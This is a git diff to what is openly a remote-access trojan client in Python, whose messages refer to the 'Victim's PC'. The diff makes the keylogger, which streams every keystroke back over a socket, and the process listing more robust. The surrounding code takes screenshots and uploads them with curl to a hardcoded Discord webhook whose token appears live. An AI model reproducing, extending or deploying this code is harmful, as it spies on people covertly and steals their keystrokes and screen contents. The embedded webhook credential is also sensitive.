@@ -8,8 +8,6 @@ import requests
 import cv2
 import numpy as np
 import subprocess
-from pynput import *
-import wmi
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -50,8 +48,13 @@ class Client():
             self.client.send(f"Opening {_URL_TO_OPEN} In Victim's PC!".encode())
         # Log Keys
         if self.command=="log_keys":
-            with keyboard.Listener(on_press=self.log_keys) as listener:
-                listener.join()
+            try:
+                import pynput
+            except:
+                self.client.send("pynput Isn't Installed In Victim's PC Or Victim Is Not Using Windows".encode())
+            else:
+                with pynput.keyboard.Listener(on_press=self.log_keys) as listener:
+                    listener.join()
         # Get All Running Process
         if self.command=="get_running_process":
             try:
@@ -79,9 +82,10 @@ class Client():
         ImageGrab.grab().save("screenshot.png")
         _temp_path=os.path.join(os.getcwd(),"screenshot.png")
         subprocess.getoutput(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
-    def log_keys(self,key:keyboard.KeyCode | keyboard.Key) -> None:
+    def log_keys(self,key:Any) -> None:
         self.client.send(str(key).encode())
     def get_running_process(self) -> str:
+        import wmi
         w=wmi.WMI()
         ps=""
         for i in w.Win32_Process():
